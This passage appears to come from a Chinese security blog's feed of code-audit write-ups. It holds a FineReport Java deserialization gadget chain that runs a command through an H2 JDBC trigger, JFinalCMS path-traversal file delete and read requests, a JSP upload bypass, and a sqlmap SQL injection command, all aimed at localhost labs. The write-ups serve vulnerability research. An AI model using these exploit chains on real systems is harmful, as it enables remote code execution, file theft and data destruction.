com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sql</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ÈÄöËøájacksonËß¶ÂèëgetterÂç≥getXAConnection()ÔºåJSONArrayÁöÑtoString‰ºöË∞ÉÁî®jacksonÂéüÁîüÂèçÂ∫èÂàóÂåñ</span></span><br><span class="line">        <span class="comment">//Âç≥writeValueAsStringÔºå‰ªéËÄåËß¶Âèëgetter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Ëß¶ÂèëUIDefaults$TextAndMnemonicHashMapÁöÑgetÊñπÊ≥ï</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">transactionHistogram</span> <span class="operator">=</span> DruidAbstractDataSource.class.getDeclaredField(<span class="string">&quot;transactionHistogram&quot;</span>);</span><br><span class="line">        transactionHistogram.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transactionHistogram.set(druidXADataSource,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">initedLatch</span> <span class="operator">=</span> DruidDataSource.class.getDeclaredField(<span class="string">&quot;initedLatch&quot;</span>);</span><br><span class="line">        initedLatch.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initedLatch.set(druidXADataSource,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Field field=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        Field field1=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Serialize(hashtable);</span></span><br><span class="line">        Unserialize(<span class="string">&quot;H4sIAAAAAAAAAKVZXWwcVxW+69iJYzv+i2MnaZIacJuEtLslCW0aKyS.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// Â∫èÂàóÂåñ</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ÂåÖË£ÖÊàêZIP</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">baos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPOutputStream</span> <span class="variable">gos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos3);</span><br><span class="line">        gos3.write(baos.toByteArray());</span><br><span class="line">        gos3.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos3.toByteArray());</span><br><span class="line">        System.out.println(base64str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">(String base64str)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64str));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(bais);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(gis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span>(Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ÂèÇËÄÉÊñáÁ´†"><a href="#ÂèÇËÄÉÊñáÁ´†" class="headerlink" title="ÂèÇËÄÉÊñáÁ´†"></a>ÂèÇËÄÉÊñáÁ´†</h2><p><a href="https://blog.csdn.net/qq_51295677/article/details/131789320">Â∏ÜËΩØ FineReport&#x2F;FineBI channelÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê_Â∏ÜËΩØÂèçÂ∫èÂàóÂåñ-CSDNÂçöÂÆ¢</a></p><p><a href="https://forum.butian.net/share/2806">https://forum.butian.net/share/2806</a></p><p><a href="https://xz.aliyun.com/t/14800">https://xz.aliyun.com/t/14800</a></p>]]></content>
      
      
      <categories>
          
          <category> ‰ª£Á†ÅÂÆ°ËÆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JFinalCMSÂÆ°ËÆ°ÁªÉ‰π†</title>
      <link href="/2024/07/JFinalCMS%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/07/JFinalCMS%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÈ¶ñÂèë‰∫éÂÖàÁü•Á§æÂå∫Ôºö<a href="https://xz.aliyun.com/t/14957">https://xz.aliyun.com/t/14957</a></strong></p><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>ÁúãÂà∞ÊòüÁêÉÂèëÂ∏É‰∫Ü‰∏Ä‰∏™‰Ωú‰∏öÔºåÁî±‰∫éËÄÉËØïÊ≤°ÂèäÊó∂ÂºÑ„ÄÇÊâÄ‰ª•Â∞±Ëá™Â∑±Èöè‰æøÁúãÁúã‰∫ÜÔºåËøôÂ•óÁ≥ªÁªüÁ°ÆÂÆûÊºèÊ¥ûÂæàÂ§öÔºåÂèØ‰ª•ËØ¥ÊòØÈù∂Âú∫„ÄÇ„ÄÇ„ÄÇÂç±Èô©Êìç‰ΩúÂá†‰πéÈÉΩÊ≤°ÊúâÂÅöËøáÊª§ÔºåËÄå‰∏îÂæà‰πÖÊ≤°Êõ¥Êñ∞‰∫Ü</p><h2 id="ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§"><a href="#ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§" class="headerlink" title="ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§"></a>ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§</h2><p>Ëøô‰∏™Ê¥ûÊèê‰∫ÜcveÔºåÁúãÂ§ßÂÆ∂ÈÉΩÂú®Ê∞¥Êàë‰πüÊ∞¥‰∏Ä‰∏™</p><p>ÊºèÊ¥ûÂæàÁÆÄÂçïÔºåÁîöËá≥‰∏çÈúÄË¶ÅÁôΩÁõíÔºåÈªëÁõíËÉΩÁõ¥Êé•ÊµãÂá∫Êù•Ôºå‰ΩÜÊòØ‰ª£Á†ÅÂÆ°ËÆ°ËøòÊòØÁúã‰ª£Á†ÅÂêßÔºåÊàëÂÆ°Ëøô‰∏™ÁöÑÊó∂ÂÄô‰πüÊòØÁõ¥Êé•ÁúãÁöÑ‰ª£Á†ÅÔºå‰ª£Á†Å‰ΩçÁΩÆÂú®<code>src/main/java/com/cms/controller/admin/DatabaseController.java</code> Êñá‰ª∂‰∏ãÁöÑ<code>/delete</code> Êé•Âè£</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291506650.png" alt="Untitled"></p><p>Ë∑üËøõËøô‰∏™deleteÊñπÊ≥ï</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507703.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞ÂØπËøô‰∏™ÂèÇÊï∞Ê≤°ÊúâÂÅö‰ªª‰ΩïÁöÑÊ£ÄÊµãÔºå‰ªÖ‰ªÖÂè™Áúã‰∫ÜÊñá‰ª∂ÊòØÂê¶Â≠òÂú®</p><p>pocÂ¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/database/delete HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;113&quot;</span>, <span class="string">&quot;Not-A.Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">113.0</span><span class="number">.5672</span><span class="number">.127</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?<span class="number">1</span></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: JSESSIONID=6DD997E088E0DCBF8F72AF2897F1B845</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">37</span></span><br><span class="line"></span><br><span class="line">name=../../../../../../../../flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507174.png" alt="Untitled"></p><p>ÊâßË°åÂêé</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507883.png" alt="Untitled"></p><p>ÁÑ∂ÂêéÂ∞±ÊòØissue‰∏äÁöÑ‰∏Ä‰∫õÊºèÊ¥û‰∫ÜÔºåÂ≠¶‰π†‰∏Ä‰∏ã</p><h2 id="ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ"><a href="#ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ" class="headerlink" title="ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ"></a>ÂâçÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</h2><p>‰πüÊòØÊñá‰ª∂ÂêçÊ≤°ÊúâÂÅö‰ªª‰ΩïËøáÊª§ÔºåÁõ¥Êé•ÂèØ‰ª•ËØªÂèñÊàêÂäü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507659.png" alt="Untitled"></p><p>payloadÂ¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /common/file/download?fileKey=../../../../../../../flag.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;113&quot;</span>, <span class="string">&quot;Not-A.Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">113.0</span><span class="number">.5672</span><span class="number">.127</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?<span class="number">1</span></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507402.png" alt="Untitled"></p><h2 id="‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†"><a href="#‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†" class="headerlink" title="‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†"></a>‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</h2><p>Ëøô‰∏™‰πüÊòØissueÈáåÈù¢ÁöÑ</p><p>Âú®Êñá‰ª∂<code>com/cms/controller/admin/FileController.java</code> ‰∏ãÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</p><p>‰∏≠Èó¥ÂîØ‰∏ÄÁöÑÊ£ÄÈ™åÊòØ‰∏Ä‰∏™Ê∞¥Âç∞Áõ∏ÂÖ≥ÁöÑ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.getIsWatermarkEnabled() &amp;&amp; ArrayUtils.contains(imageSuffixs, suffix.toLowerCase()))&#123;</span><br><span class="line">            String watermarkImage = config.getWatermarkImage();</span><br><span class="line">            String watermarkPosition = config.getWatermarkPosition();</span><br><span class="line">            File watermarkImageFile = new File(PathUtils.getWebRootPath()+watermarkImage);</span><br><span class="line">            String sourceFileName = newFileBaseName+<span class="string">&quot;_source.&quot;</span>+suffix;</span><br><span class="line">            File sourceFile = new File(PathUtils.getWebRootPath()+<span class="string">&quot;/&quot;</span>+CommonConstant.UPLOAD_PATH+<span class="string">&quot;/&quot;</span>+sourceFileName);</span><br><span class="line">            newFile.renameTo(sourceFile);</span><br><span class="line">            ImageUtils.addWatermark(sourceFile, newFile, watermarkImageFile, watermarkPosition);</span><br><span class="line">            FileUtils.deleteQuietly(sourceFile);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™ifÊó†ÊâÄË∞ìÔºåÂç≥‰Ωø‰∏çÊâßË°å‰πüËÉΩÊ≠£Â∏∏‰∏ä‰º†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507783.png" alt="Untitled"></p><p>Âõ†‰∏∫Êúâ‰∫õË°®ÂçïÁöÑÂ§ÑÁêÜÊáíÂæóÂÜôÔºåÊâÄ‰ª•Áõ¥Êé•Êäì‰∏ä‰º†ÂåÖÂç≥ÂèØ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508985.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•‰∏ä‰º†ÊàêÂäü‰∫ÜÔºå‰ΩÜÊòØspringbootÊòØ‰∏çËÉΩËß£ÊûêjspÁöÑÔºåÊâÄ‰ª•ËøôÊ†∑‰∏ä‰º†‰∫Ü‰πüÊ≤°Áî®ÔºåËÆøÈóÆÊòØÁõ¥Êé•‰∏ãËΩΩÔºå‰∏çÁü•ÈÅìÈÇ£‰∏™issueÊòØÊÄé‰πàÂ§ÑÁêÜÁöÑÔºåÂêéÈù¢Áúã‰∫Ü‰∏Ä‰∏ãÁî®tomcatÂêØÂä®ÈÉ®ÁΩ≤Âç≥ÂèØËß£ÊûêjspÔºå‰ΩÜÊòØÂ§ö‰∫Ü‰∏Ä‰∏™ifÈúÄË¶ÅÁªïËøá</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291545157.png" alt="image-20240629154500379"></p><p>‰ªîÁªÜÁúã‰∫Ü‰∏Ä‰∏ãÈÇ£‰∏™issueÔºåÈÇ£‰∏™ÊòØÊ≤°Êúâ‰∏ãÈù¢ËøôÂè•‰ª£Á†ÅÁöÑÔºåÂ∫îËØ•ÊòØ‰ΩúËÄÖÊõ¥Êñ∞‰∫Ü‰∏Ä‰∏ãÔºå‰∏îifÈÄªËæëÂ§ÑÁêÜÁ®çÂæÆ‰∏ç‰∏ÄÊ†∑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UploadFile uploadFile = getFile();</span><br></pre></td></tr></table></figure><p>issue‰ª£Á†ÅÂ¶Ç‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291545071.png" alt="image-20240629154528516"></p><p>Ê≤°ÊÉ≥Âà∞‰ªÄ‰πàÁªïËøáÊñπÊ≥ïÔºåÂè¶Â§ñjfinalÈªòËÆ§‰∏çÂÖÅËÆ∏Áõ¥Êé•ËÆøÈóÆjspÊñá‰ª∂ÔºåËøôÁßçÁªïËøáÁõ¥Êé•Âä†‰∏™ÂàÜÂè∑Âç≥ÂèØÔºåÂç≥<code>1.jsp;</code></p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291546007.png" alt="image-20240629154603085"></p><p>Ëøô‰∏™ÊòØÊàëÊâãÂä®ÂàõÂª∫ÁöÑÔºå‰º†ÊòØ‰º†‰∏ç‰∫Ü‰∏ÄÁÇπÔºåÂ¶ÇÊûúÊúâÂ§ß‰Ω¨Áü•ÈÅìÊÄé‰πàÁªïËøòËØ∑ÊåáÁÇπ‰∏Ä‰∫å</p><h2 id="SQLÊ≥®ÂÖ•"><a href="#SQLÊ≥®ÂÖ•" class="headerlink" title="SQLÊ≥®ÂÖ•"></a>SQLÊ≥®ÂÖ•</h2><p>Âú®springboot‰∏≠‰ΩøÁî®‰∫Ümybatis-plusÔºå‰ΩÜÊòØÂú®Ëøô‰∏™È°πÁõÆÁöÑ<strong>JFinalÁâàÊú¨</strong>Âπ∂Ê≤°Êúâ‰ΩøÁî®ÔºåÊâÄ‰ª•Âú®‰∏Ä‰∫õÊé•Âè£ÈÄ†Êàê‰∫ÜsqlÊ≥®ÂÖ•</p><p>È¶ñÂÖàÊòØÂú®<code>com/cms/controller/admin/AdminController.java</code> Êñá‰ª∂‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508095.png" alt="Untitled"></p><p>ËøôÈáåindexÊé•Âè£Âç≥ÈªòËÆ§Êé•Âè£ÔºåÊé•Êî∂ÁöÑ‰∏â‰∏™ÂèÇÊï∞ÈÉΩËøõÂÖ•‰∫ÜfindPageÊñπÊ≥ïÔºåÁõ¥Êé•Ë∑üËøõËøô‰∏™ÊñπÊ≥ï</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508153.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞‰∏â‰∏™ÂèÇÊï∞ÈÉΩÁõ¥Êé•ËøõÂÖ•‰∫ÜsqlËØ≠Âè•‰∏≠Êó†‰ªª‰ΩïËøáÊª§ÔºåËøôÈáåÂõ†‰∏∫ÁºñÁ†ÅÁöÑÂéüÂõ†ÂØºËá¥Â∏ÉÂ∞îÁõ≤Ê≥®ÂõûÊòæÁªìÊûú‰∏çÊòØÂæàÂáÜÁ°ÆÊâÄ‰ª•Áõ¥Êé•Áî®Âª∂Êó∂Ê≥®ÂÖ•Âç≥ÂèØ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508965.png" alt="Untitled"></p><p>ÊîæsqlmapË∑ë‰∏Ä‰∏ãÂç≥ÂèØ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span>/admin/admin?name=r --dbs --cookie JSESSIONID=ABB781F07C8BD899D6B9BCE286EAA9F0 --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508062.png" alt="Untitled"></p><p>ÂÖ∂ÂÆÉÂú∞ÊñπËøòÊúâÂæàÂ§öÔºåÈÉΩÊòØÁõ¥Êé•Áî®‰∫ÜfindPageÊñπÊ≥ïÔºåÊ≤°ÊúâÂÅöÂ§ÑÁêÜÂ∞±‰∏ç‰∏Ä‰∏™‰∏™Áúã‰∫Ü</p>]]></content>
      
      
      <categories>
          
          <category> ‰ª£Á†ÅÂÆ°ËÆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Showdoc &lt;= 3.2.5 SQLÊ≥®ÂÖ•ÂèäÂèçÂ∫èÂàóÂåñÂàÜÊûê</title>
      <link href="/2024/06/Showdoc3-2-5-SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/Showdoc3-2-5-SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152000088.png" alt="Untitled"></p><h2 id="SQLÊ≥®ÂÖ•ÁÇπÂØªÊâæ"><a href="#SQLÊ≥®ÂÖ•ÁÇπÂØªÊâæ" class="headerlink" title="SQLÊ≥®ÂÖ•ÁÇπÂØªÊâæ"></a>SQLÊ≥®ÂÖ•ÁÇπÂØªÊâæ</h2><p>ÂΩìÊó∂ÁöÑÈÄöÊä•ÊòØËøô‰∏™ÔºåÂΩìÊó∂Âú®3.2.5ÁâàÊú¨Ê†πÊú¨Ê≤°Êúâ‰øÆÂ§çËøô‰∏™sqlÊ≥®ÂÖ•ÔºåÂØπÁùÄcommitÊèê‰∫§ÁöÑÈÇ£Âá†‰∏™Ë∑ØÁî±‰∏ÄÁõ¥Êâæ‰πüÊ≤°ÊâæÂá∫Ê≥®ÂÖ•ÁÇπ„ÄÇ„ÄÇ„ÄÇ‰∏ç‰πÖÂêéÂèëÂ∏É‰∫Ü3.2.6ÁâàÊú¨‰∏ÄÁúºÂ∞±ËÉΩÁúãÂá∫Ê≥®ÂÖ•ÁÇπ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001791.png" alt="Untitled"></p><p>ÂæàÊòéÊòæÁúãÂà∞ÂØπ<code>item_id</code> ËøõË°å‰∫Ü‰øÆÂ§çÂÅö‰∫ÜÂ∫îËØ•ÊòØÈ¢ÑÂ§ÑÁêÜÔºåÊù•Âà∞Ê∫êÁ†ÅÁúã‰∏Ä‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001062.png" alt="Untitled"></p><p>ËÆ∞ÂæóÂΩìÊó∂ÂàÜÊûêÁöÑÊó∂ÂÄôÂØπ<code>page_id/d</code> ËøôÁßçÂÜôÊ≥ïÁúã‰∫ÜÂæà‰πÖÔºåÂêéÈù¢Ë∞ÉËØïÁöÑÊó∂ÂÄô‰∏ÄÊ≠•Ê≠•Ë∑üËøõÂéªÊâçÊòéÁôΩ‰ΩúÁî®ÔºåÂÖ∂ÂÆûÂ∞±ÊòØÂÅöÂº∫ËΩ¨Â§ÑÁêÜ</p><p><img 